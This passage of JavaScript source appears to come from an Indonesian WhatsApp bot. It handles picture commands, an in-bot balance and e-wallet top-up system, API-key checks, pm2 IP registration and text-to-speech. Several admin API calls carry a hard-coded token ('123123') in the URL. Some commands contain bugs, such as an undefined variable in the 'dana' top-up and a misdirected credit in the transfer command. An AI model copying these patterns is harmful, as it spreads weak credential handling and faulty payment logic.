case 'justina':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'kayes':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'kpop':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'notnot':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'car':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'couplepic':case 'couplepicture':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'profilepic':  case 'profilepicture':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'pubg':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'rose':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'ryujin':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'ulzzangboy':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'ulzzanggirl':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break
case 'wallpaperphone': case 'wallphone':
reply(mess.search)
var notnot = JSON.parse(fs.readFileSync('./lib/HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
RezzHost.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: kalgans })
break


// BATAS RANDOM PHOTO

// OTOMATIS MENU


case 'transfer': {
if (m.quoted) {
         function no(number) {
          return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
         if (m.quoted.isBot) return reply2(Func.texted('bold', `🚩 Cannot make transfers to bot.`))
         if (!args || !args[0]) return reply2(Func.texted('bold', `🚩 Provide the nominal balance to be transferred.`))
         if (isNaN(args[0])) return reply2(Func.texted('bold', `🚩 The balance must be a number.`))
         let nominal = parseInt(args[0])
         let ppn = parseInt(((25 / 100) * nominal).toFixed(0))
         let point = users.balance
         let user = global.db.data.users
         let target = RezzHost.decodeJid(m.quoted.sender)
         let hl = [];
         hl[0] = text.split(" ")[0];
         hl[0] = no(hl[0]) + "@s.whatsapp.net";
         if (nominal > point) return reply2(Func.texted('bold', `🚩 Your balance is not enough to make a transfer.`))
         if ((nominal + ppn) > point) return reply2(Func.texted('bold', `🚩 Your balance is not enough to pay the transfer fee of 25%`))
         if (nominal < 5000) return reply2(Func.texted('bold', `🚩 Nominal balance for transfer is at least 5K.`))
         users.balance -= (nominal + ppn)
         user[froms].balance += nominal
         let teks = `乂  *T R A N S F E R*\n\n`
         teks += `“Transfer successfully to *@${target.replace(/@.+/g, '')}*”\n\n`
         teks += `➠ *Nominal* : ${Func.formatNumber(nominal)}\n`
         teks += `➠ *Fee* : ${Func.formatNumber(ppn)} [25%]\n`
         teks += `➠ *Remaining Balance* : ${Func.formatNumber(user[froms].balance)}`
         reply(teks)
      } else if (text) {
         function no(number) {
          return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
         if (!args || !args[1]) return reply2(Func.texted('bold', `🚩 Provide the nominal balance to be transferred.`))
         if (isNaN(args[1])) return reply2(Func.texted('bold', `🚩 The balance must be a number.`))
         let nominal = parseInt(args[1])
         let ppn = parseInt(((25 / 100) * nominal).toFixed(0))
         let point = users.balance
         let user = global.db.data.users
         let hl = [];
         hl[0] = text.split(" ")[0];
         hl[0] = no(hl[0]) + "@s.whatsapp.net";
         if (nominal > point) return reply2(Func.texted('bold', `🚩 Your balance is not enough to make a transfer.`))
         if ((nominal + ppn) > point) return reply2(Func.texted('bold', `🚩 Your balance is not enough to pay the transfer fee of 25%`))
         if (nominal < 5000) return reply2(Func.texted('bold', `🚩 Nominal balance for transfer is at least 5K.`))
         users.balance -= (nominal + ppn)
         user[hl[0]].balance += nominal
         let teks = `乂  *T R A N S F E R*\n\n`
         teks += `“Transfer successfully to *@${hl[0].split("@")[0]}*”\n\n`
         teks += `➠ *Nominal* : ${Func.formatNumber(nominal)}\n`
         teks += `➠ *Fee* : ${Func.formatNumber(ppn)} [25%]\n`
         teks += `➠ *Remaining Balance* : ${Func.formatNumber(user[hl[0]].balance)}`
         reply(teks)
      } else {
         let teks = `• *Example* :\n\n`
         teks += `${prefix + command} @0 10000\n`
         teks += `${prefix + command} 10000 (reply chat target)`
         reply(teks)
      }
}
break
case 'topup': {
if (!text) return reply2(`𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖯𝗂𝗅𝗂𝗁:\n\n𝟣.𝗀𝗈𝗉𝖺𝗒\n𝟤.𝖽𝖺𝗇𝖺\n𝟥.𝗈𝗏𝗈\n\nCara penggunaan:\n${command} [Number]|[Amount]\n\nContoh:\n${command} 085868769013|10000`)
let [Number, Amount] = text.split("|")
if (!Number) return reply2(`Masukkan nomer ovo mu`)
if (!Amount) return reply2(`Masukkan nominal nya`)
if (args[0] === 'gopay') {
 let res = await fetchJson(`https://api.neoxr.eu/api/topup-gopay?number=${Number}&amount=${Amount}`)
 let v = res.data
 let teks = `乂 𝗧 𝗢 𝗣 𝗨 𝗣 – 𝗚 𝗢 𝗣 𝗔 𝗬\n\n`
 teks += `*Id* : ${v.id}\n`
 teks += `*Code* : ${v.code}\n`
 teks += `*Number*: ${v.number}\n`
 teks += `*Harga* : ${v.price_format}\n\n`
 teks += `*𝖭𝗈𝗍𝖾 :* 𝖧𝖺𝗋𝖺𝗉 𝖳𝖿 𝖲𝖾𝖻𝖾𝗅𝗎𝗆\n`
 teks += `${v.expired_at}`
 let buffer = new Buffer.from(`${v.qr_image}`, 'base64')
RezzHost.sendMessage(from, { image: buffer, mimetype: 'image/jpeg', caption: teks },{quoted: kalgans})
} else if (args[0] === 'dana') {
let res = await fetchJson(`https://api.neoxr.eu/api/topup-dana?number=${Number}&amount=${Amount}`)
 let teks = `乂 𝗧 𝗢 𝗣 𝗨 𝗣 – 𝗗 𝗔 𝗡 𝗔\n\n`
 teks += `*Id* : ${v.id}\n`
 teks += `*Code* : ${v.code}\n`
 teks += `*Number*: ${v.number}\n`
 teks += `*Harga* : ${v.price_format}\n\n`
 teks += `*𝖭𝗈𝗍𝖾 :* 𝖧𝖺𝗋𝖺𝗉 𝖳𝖿 𝖲𝖾𝖻𝖾𝗅𝗎𝗆\n`
 teks += `${v.expired_at}`
 let buffer = new Buffer.from(`${v.qr_image}`, 'base64')
 RezzHost.sendMessage(from, { image: buffer, mimetype: 'image/jpeg', caption: teks },{quoted: kalgans})
} else if (args[0] === 'ovo') {
 let res = await fetchJson(`https://api.neoxr.eu/api/topup-ovo?number=${Number}&amount=${Amount}`)
 let v = res.data
 let teks = `乂 𝗧 𝗢 𝗣 𝗨 𝗣 – 𝗢 𝗩 𝗢\n\n`
 teks += `*Id* : ${v.id}\n`
 teks += `*Code* : ${v.code}\n`
 teks += `*Number*: ${v.number}\n`
 teks += `*Harga* : ${v.price_format}\n\n`
 teks += `*𝖭𝗈𝗍𝖾 :* 𝖧𝖺𝗋𝖺𝗉 𝖳𝖿 𝖲𝖾𝖻𝖾𝗅𝗎𝗆\n`
 teks += `${v.expired_at}`
 let buffer = new Buffer.from(`${v.qr_image}`, 'base64')
RezzHost.sendMessage(from, { image: buffer, mimetype: 'image/jpeg', caption: teks },{quoted: kalgans})
}
}
break
case 'checktopup': {
 if (!text) return reply2(`Cara penggunaan:\n${command} [Id]|[Code]\n\nContoh:\n${command} 659252a6f377ef01384d41d1|240101431187510`)
let [Id, Code] = text.split("|")
if (!Id) return reply2(`Masukkan Id Nya`)
if (!Code) return reply2(`Masukkan Code nya`)
let res = await fetchJson(`https://api.neoxr.eu/api/topup-check?id=${Id}&code=${Code}`)
reply2(`${res.data.status}`)
}
break
case 'saldo':{
dos = `*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${users.balance}_

*Note :*
_Saldo hanya bisa untuk beli di bot_
_Tidak bisa ditarik atau transfer_!`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${users.balance}`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: dos,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'addsaldo':
case 'acc': {
    if (!isCreator) return m.reply(mess.owner);
    
    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }
    
    var hl = [];
    hl[0] = text.split(" ")[0];
    hl[0] = no(hl[0]) + "@s.whatsapp.net";
    hl[1] = parseFloat(text.split(" ")[1]); // Ubah saldo ke tipe data angka
    if (!text || isNaN(hl[1])) return m.reply('Cara Pemakaian Salah\nContoh: .addsaldo 6281288031294 10000');
    
    let user = global.db.data.users;
    
    user[hl[0]].balance += hl[1];
    await sleep(50);
    
    reply(`「 SALDO USER 」
⭔ID: @${sender.split("@")[0]}
⭔Nomer: ${hl[0]}
⭔Tanggal: ${hariini}
⭔Saldo: Rp ${user[hl[0]].balance}, `);
    
    let messageText = `DONE KAK DEPOSIT SUDAH BERHASIL SEJUMLAH ${hl[1]} TELAH DITAMBAHKAN KE SALDO ANDA CEK SALDO KETIK .SALDO TERIMAKASIH`;
    let targetNumber = hl[0];
    
    RezzHost.sendMessage(targetNumber, {
        text: `*${messageText}*`,
        mentions: [sender]
    }, {
        quoted: kalgans
    }).then(() => {
        reply('Acc Berhasil Tuan✅');
    }).catch(() => {
        reply('Gagal mengirim pesan!');
    });
    break;
}
      case 'minsaldo': {
        if (!isCreator) return m.reply(mess.owner);

        function no(number) {
          return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        var hl = [];
        hl[0] = text.split(" ")[0];
        hl[0] = no(hl[0]) + "@s.whatsapp.net";
        hl[1] = text.split(" ")[1];
        if (!text) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: .minsaldo 6281288031294 10000`);
        let user = global.db.data.users
        
user[hl[0]].balance -= hl[1]
await sleep(50)
reply(`「 *SALDO USER* 」
⭔ID: ${hl[0]}
⭔Nomer: @${hl[0]}
⭔Tanggal: ${hariini}
⭔Saldo: Rp ${user[hl[0]].balance}, `)
        }
        break;
case 'bukti':{
           let jumlah = args[0]
           if (!jumlah) return reply('Jumblah nya?')
reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT')
RezzHost.sendMessage(`${owner}@s.whatsapp.net`, { text: `*ADA YANG DEPOSIT NIH*\n*SEJUMLAH ${jumlah} DARI @${sender.split('@')[0]}*\n*INGIN ACC DEPOSIT? KETIK*\n*${prefix}acc MAU NOLAK? BIARIN AJA*`, mentions: [sender]}, { quoted: kalgans })
        }
        break
case 'deposit':
        depo = `UNTUK DEPOSIT SILAHKAN KETIK *.payment*
contoh : ${prefix}dana 5000

`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: depo,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break


// BATAS OTOMATIS MENU


// API MENU 


case 'capi': {
let anu = await fetchJson(`https://api.caliph.biz.id/users/cek?apikey=${caliph}`)
let cpi = `乂 I N F O - A P I K E Y\n\n   ◦  Username : ${anu.username}\n   ◦  Limit : ${anu.limit}\n   ◦  Premium : ${anu.premium}\n   ◦  Expired : ${anu.expired}\n\n${footer}`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 50000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: cpi,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'resetlimit': {
let anu = await fetchJson(`https://api.kayyofc.biistoreee.com/admin/resetall?token=123123`)
reply(`${anu.message}`)
}
break
case 'delusrapi': {
if (!q) return reply(`Cara penggunaan:\n\nContoh:\n${prefix + command} kayypedia`)
let anu = await fetchJson(`https://api.kayyofc.biistoreee.com/admin/delete-user?username=${q}&token=123123`)
reply(`${anu.message}`)
}
break
case 'apineosearch': {
if (!text) return reply(`masukan keys nya`)
let anu = await fetchJson(`https://api.neoxr.my.id/api/check?apikey=${text}`)
an = anu.data
let cpl = `乂 N E O - K E Y\n\n   ◦  Username : ${an.name}\n   ◦  Limit : ${an.limit}\n   ◦  Total : ${an.total}\n   ◦  Premium : ${an.premium}\n   ◦  expired : ${an.expired_at}`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 50000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: cpl,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'apineocek': {
let anu = await fetchJson(`https://api.neoxr.my.id/api/check?apikey=${ApiNx}`)
an = anu.data
let cpl = `乂 N E O - K E Y\n\n   ◦  Username : ${an.name}\n   ◦  Limit : ${an.limit}\n   ◦  Total : ${an.total}\n   ◦  Premium : ${an.premium}\n   ◦  expired : ${an.expired_at}`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 50000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: cpl,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'apilolsc': {
if (!text) return reply('mana apikey nya')
let anu = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${args[0]}`)
let cpl = `乂 L O L - K E Y\n\n   ◦  Username : ${anu.result.username}\n   ◦  request : ${anu.result.requests}\n   ◦  today : ${anu.result.today}\n   ◦  type : ${anu.result.account_type}\n   ◦  expired : ${anu.result.expired}`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 50000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: cpl,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'cekapikey': {
if (!text) return reply('mana apikey nya')
let anu = await fetchJson(`https://api.kayyofc.biistoreee.com/users/cek?apikey=${args[0]}`)
let cpi = `乂 L I P H - K E Y\n\n   ◦  Username : ${anu.username}\n   ◦  Limit : ${anu.limit}\n   ◦  Premium : ${anu.premium}\n   ◦  Expired : ${anu.expired}`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 50000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: cpi,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'apilol': {
let anu = await fetchJson(`https://api.lolhuman.xyz/api/checkapikey?apikey=${apikey}`)
let cpl = `乂 I N F O - A P I K E Y\n\n   ◦  Username : ${anu.result.username}\n   ◦  request : ${anu.result.requests}\n   ◦  today : ${anu.result.today}\n   ◦  type : ${anu.result.account_type}\n   ◦  expired : ${anu.result.expired}\n\n${footer}`
await RezzHost.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 50000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: cpl,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'delapi': {
if (!q) return reply(`Cara penggunaan:\n\nContoh:\n${prefix + command} kayypedia`)
let anu = await fetchJson(`https://api.kayyofc.biistoreee.com/premium/delete-premium?username=${q}&token=123123`)
reply(`${anu.message}`)
}
break
case 'apiprem': {
if (!text) return reply(`Cara penggunaan:\n\nContoh:\n${prefix + command} kayypedia|Biiofcc`)
let [namanya, reqkey] = text.split("|")
if (!namanya) return reply(`Masukkan usernamenya`)
if (!reqkey) return reply(`request apikeynya`)
let anu = await fetchJson(`https://api.kayyofc.biistoreee.com/premium/add-premium?username=${namanya}&expired=100&customKey=${reqkey}&token=123123`)
reply(`${anu.message}`)
}
break


// BATAS API MENU


// PM2 MENU


case 'addip':
  if (!isCreator) return reply('ngapain om');

  if (args.length !== 1) {
    return reply('Format penggunaan salah. Contoh: !addip <url atau ip>');
  }
  
  const input = args[0];

  function resolveToIp(input) {
    return new Promise((resolve, reject) => {
      if (isValidIp(input)) {
        resolve(input);
      } else {
        dns.resolve4(input, (err, addresses) => {
          if (err) {
            reject(err);
          } else {
            resolve(addresses[0]);
          }
        });
      }
    });
  }

  function isValidIp(input) {
    return /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(input);
  }
  
  resolveToIp(input)
    .then(ip => {
      const apiUrl = 'https://cekilhost.net/api/addcekil';

      axios.post(apiUrl, `ip=${ip}`)
        .then(response => {
          if (response.data.status === mess.success) {
            const successMessage = `Berhasil Mendaftar pm2 dengan IP/URL: ${ip}`;
            reply(successMessage);

            //Mengirim file cekil.json dari direktori
            let cekil = fs.readFileSync('./src/cekil.json', 'utf-8');

            // Mengirim file cekil.json sebagai dokumen
            RezzHost.sendMessage(m.chat, { document: Buffer.from(cekil), mimetype: 'application/json', fileName: 'cekil.json' }, { quoted: kalgans });
          } else {
            const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
            reply(errorMessage);
          }
        })
        .catch(error => {
          console.error(error);
          reply('Terjadi kesalahan saat mengirim permintaan.');
        });
    })
    .catch(error => {
      console.error(error);
      reply2('Terjadi kesalahan saat melakukan DNS lookup atau input tidak valid.');
    });
  break
  case 'deleteip':
    if (!isCreator) return reply2('ngapain om');

    if (args.length !== 1) {
        return reply2('Format penggunaan salah. Contoh: !deleteip <ip>');
    }

    const ipToDelete = args[0];

    const deleteUrl = 'https://cekilhost.net/api/deletecekil';

    require('axios').post(deleteUrl, `ip=${ipToDelete}`)
        .then(response => {
            if (response.data.status === mess.success) {
                const successMessage = `IP ${ipToDelete} berhasil dihapus.`;
                reply2(successMessage);
            } else {
                const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
                reply2(errorMessage);
            }
        })
        .catch(error => {
            console.error(error);
            reply2('Terjadi kesalahan saat mengirim permintaan.');
        });
    break
    case 'listip':
    if (!isCreator) return reply2('ngapain banh');

    const listUrl = 'https://cekilhost.net/api/listnew';

    axios.get(listUrl)
        .then(response => {
            if (response.data.status === mess.success) {
                const ipList = response.data.ips.join('\n');
                const message = `Daftar IP yang terdaftar:\n${ipList}`;
                reply2(message);
            } else {
                const errorMessage = 'Terjadi kesalahan: ' + response.data.message;
                reply2(errorMessage);
            }
        })
        .catch(error => {
            console.error(error);
            reply2('Terjadi kesalahan saat mengirim permintaan.');
        });
    break


// BATAS PM2 MENU


// E-PERPUS MENU


case 'cerpen': {
const category = (`*BERIKU LIST CERPEN* :\n\n   ◦  anak\n   ◦  jawa\n   ◦  sunda\n   ◦  budaya\n   ◦  cinta\n   ◦  galau\n   ◦  gokil\n   ◦  inspiratif\n   ◦  jepang\n   ◦  kehidupan\n   ◦  keluarga\n   ◦  korea\n   ◦  kristen\n   ◦  liburan\n   ◦  lingkungan\n   ◦  malaysia\n   ◦  mengharukan\n   ◦  misteri\n   ◦  motivasi\n   ◦  nasihat\n   ◦  nasionalisme\n   ◦  olahraga\n   ◦  penantian\n   ◦  pendidikan\n   ◦  pengorbanan\n   ◦  penyesalan\n   ◦  perjuangan\n   ◦  perpisahan\n   ◦  persahabatan\n   ◦  petualangan\n   ◦  ramadhan\n   ◦  remaja\n   ◦  renungan\n   ◦  rindu\n   ◦  rohani\n   ◦  romantis\n   ◦  sastra\n   ◦  sedih\n   ◦  sejarah\n   ◦  terjemahan\n\n${footer}`)
if (!text) return reply(category)
reply(mess.search)
let json = await chApi.cerpen(text)
let tek = `*${json.title.toUpperCase()}*\n`
tek += `*BY* ${json.author}\n`
tek += `${json.lolos}\n`
tek += `${json.kategori}\n\n`
tek += `${json.cerita}`
RezzHost.sendMessage(m.chat, {
text: tek,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 C E R P E N`,
body: '',
thumbnailUrl: 'https://iili.io/JFmOPIV.jpg',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break


// BATAS E-PERPUS MENU


// CONVERT MENU


case 'filetourl': {
if (!/image|audio|video|document/g.test(mime)) throw `*Send/Reply the File You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the File You Want to Use as Audio With Caption* ${prefix + command}`
let media = await RezzHost.downloadMediaMessage(quoted)
let Filen = await uploadFile(media)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/filetourl?apikey=${apikey}&file=${Filen}`)
reply2(`Result :\n${anu.result}`)
}
break
case 'morsetotext': {
if (!text) return reply(`Please enter the Morse you want to convert to Text.`)
let res = await fetchJson(`https://api.lolhuman.xyz/api/morse/decrypt?apikey=${apikey}&text=${text}`)
await reply(res.result)
}
break
case 'tomorse': {
if (!text) return reply(`Please enter the text you want to convert to Morse code.`)
let res = await fetchJson(`https://api.lolhuman.xyz/api/morse/encrypt?apikey=${apikey}&text=${text}`)
await reply(res.result)
}
break
case 'topdf': {
if (!text) return reply(`Reply Image: .${command} kemii`)
if (!quoted) return reply(`Reply Image: .${command} kemii`)
let media = await quoted.download()
let url = await uploadImage(media)
let kemii = `http://api.lolhuman.xyz/api/convert/imgtopdf?apikey=${apikey}&img=${url}`
RezzHost.sendMessage(m.chat, { document: { url: kemii }, mimetype: 'application/pdf', fileName: `${text}.pdf` }, {quoted: kalgans})
}
break
case 'tolatin': {
if (!text) throw `[ ! ] *example:* ${prefix + command} ꦲꦭ꧀ꦭꦺꦴ​ꦫꦺꦏ꧀`
reply(mess.search)
let anu = await aksaraToLatin(text)
reply(`*Hasil :*\n${anu}`)
}
break
case 'toaksara': {
if (!text) throw `Ubah Latin ke Aksara Jawa\n\nContoh :\n*${prefix + command} halo rek*`
	try {
		let anu = await latinToAksara(`${text}`)
		reply(`*Hasil :*\n${anu}`)
	} catch (e) {
		console.log(e)
		reply(`Terjadi kesalahan, coba lagi nanti.`)
	}
	}
	break
case 'tohuruf': {
if (!Number(args[0])) return reply(`Example:\n${prefix}tohuruf 456`)
try {
quere = args.join(" ")
convertes = await angkaTerbilang(quere)
reply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
} catch {
reply("Error")
}
}
break
case 'ardi' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/ardi?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'gadis' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/gadis?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'janie' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/janie?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'aoi' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/aoi?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'daichi' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/daichi?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'mayu' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/mayu?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'naoki' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/naoki?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'shiori' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/shiori?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'siti' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/siti?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'dimas' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/dimas?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply2("Error!")
           }
        }
break  

case 'tuti' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/tuti?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply("Error!")
           }
        }
break  

case 'jajang' :{
        if (!isRegistered) return reply2(mess.regis)
if (!q) return reply2('Teks nya mana?')
         try {
         let ardi = await getBuffer("https://api.yanzbotz.my.id/api/tts/jajang?query=" + q)
         RezzHost.sendMessage(from, { audio: ardi, mimetype: 'audio/mp4', ptt: true}, {quoted: kalgans})
          } catch (e) {
          	reply("Error!")
           }
        }
break
case 'urltoimg':{
if (!q) return reply(`Example: ${command} https://telegra.ph/file/b398720f5f4acf97716e3.png`)
reply(mess.wait)
await sleep(1000)
let among = `https://api.lolhuman.xyz/api/urltoimg?apikey=${apikey}&url=${q}`
RezzHost.sendMessage(from, {image: { url: among }, caption: `Hasil dari ${command}`}, { quoted: kalgans })
}
break
case 'upload': {
if (isBan) return reply(mess.ban)
await loading()
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
